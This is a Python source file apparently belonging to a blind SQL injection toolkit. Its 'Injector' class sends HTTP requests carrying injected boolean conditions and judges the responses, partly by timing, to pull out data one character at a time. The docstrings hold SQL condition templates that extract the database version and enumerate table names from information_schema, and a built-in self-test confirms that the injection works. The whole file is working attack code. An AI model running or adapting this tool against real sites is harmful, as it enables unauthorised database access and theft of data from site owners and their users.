from enum import Enum
import time
from typing import Any
import requests
import json
import tqdm  # type: ignore
import loguru

from const import ALL_CHARS


class HttpMethod(Enum):
    GET = "GET"
    POST = "POST"


class Config:
    def __init__(self, raw_config: dict) -> None:
        self.max_length: int = raw_config["MAX_LENGTH"]
        self.debug: bool = raw_config["DEBUG"]
        self.proxy: str = raw_config["PROXY"]


class Injector:
    def __init__(self) -> None:
        self.url = ""
        self.http_method = HttpMethod.GET
        self.config = self.load_config()

    def generate_params(
        self,
        condition: str,
        reverse: bool,
    ) -> dict:
        return {}

    def generate_data(
        self,
        condition: str,
        reverse: bool,
    ) -> dict:
        return {}

    def generate_json(
        self,
        condition: str,
        reverse: bool,
    ) -> dict:
        return {}

    def generate_cookies(
        self,
        condition: str,
        reverse: bool,
    ) -> dict:
        return {}

    def evaluate_response(
        self,
        res: requests.Response,
        t0: float,
        t1: float,
    ) -> bool:
        raise NotImplementedError

    def load_config(self):
        with open("config.json") as file:
            raw_config = json.load(file)
        return Config(raw_config)

    def test_condition(
        self,
        condition: str,
        reverse: bool = False,
    ) -> bool:

        params = self.generate_params(condition, reverse)
        data = self.generate_data(condition, reverse)
        json = self.generate_json(condition, reverse)
        cookies = self.generate_cookies(condition, reverse)

        proxies = {"http": self.config.proxy} if self.config.debug else {}

        t0 = time.time()
        res = requests.request(
            self.http_method.value,
            self.url,
            params=params,
            data=data,
            json=json,
            cookies=cookies,
            proxies=proxies,
        )
        t1 = time.time()

        return self.evaluate_response(res, t0, t1)

    def find_number(
        self,
        length_condition_template: Any,
    ):
        """Search for the value of one number

        arguments examples:
        length_condition_template:
        """

        test = False
        for n in range(1, self.config.max_length + 1):
            condition = length_condition_template.format(length=n)
            res = self.test_condition(condition)
            if res:
                test = True
                break

        if not test:
            print(f"Error: Taille max {self.config.max_length} atteinte")
            assert False

        return n

    def find_word(
        self,
        length_condition_template: Any,
        substring_condition_template: Any,
        chars: str = ALL_CHARS,
        unknown_chars: bool = True,
    ):
        """Search for the value of one string

        arguments examples:
        length_condition_template: "(SELECT LENGTH(@@version))={length}"
        substring_condition_template: "(SELECT SUBSTRING(@@version, {position}, {length}))='{substr}'"
        """

        length = self.find_number(length_condition_template)

        word = ""
        for i in range(1, length + 1):
            test = False
            for char in chars:
                condition = substring_condition_template.format(
                    position=i,
                    length=1,
                    substr=char,
                )
                res = self.test_condition(condition)
                if res:
                    test = True
                    word += char
                    break
            if not test:
                if unknown_chars:
                    word += "_"
                else:
                    break

        loguru.logger.info(f"Found value: {word}")

        return word

    def find_values(
        self,
        count_condition_template: Any,
        length_condition_template: Any,
        substring_condition_template: Any,
    ):
        """Search for the values of one table

        arguments examples:
        count_condition_template: "(SELECT COUNT(table_name) FROM information_schema.tables)={count}"
        length_condition_template: "(SELECT LENGTH(table_name) FROM information_schema.tables LIMIT {limit} OFFSET {offset})={{length}}"
        substring_condition_template: "(SELECT SUBSTRING(table_name, {{position}}, {{length}}) FROM information_schema.tables LIMIT {limit} OFFSET {offset})={{substr}}"
        """

        count = self.find_number(count_condition_template)
        loguru.logger.info(f"Found {count} values")

        values = []
        for i in tqdm.tqdm(range(count)):
            length_condition_template_2 = length_condition_template.format(
                limit=1,
                offset=i,
            )
            substring_condition_template_2 = substring_condition_template.format(
                limit=1,
                offset=i,
            )

            word = self.find_word(
                length_condition_template_2,
                substring_condition_template_2,
            )
            values.append(word)

        return values

    def test(self) -> None:

        if self.test_condition("1=1") is False:
            raise Exception("Expect 1=1 to be True")

        if self.test_condition("1=0") is True:
            raise Exception("Expect 1=0 to be False")

        res = self.find_number("(SELECT 12)={length}")
        if res != 12:
            raise Exception(f"Expect SELECT 12 to return 12 (received {res})")

        loguru.logger.info("The SQL injection seems to work")
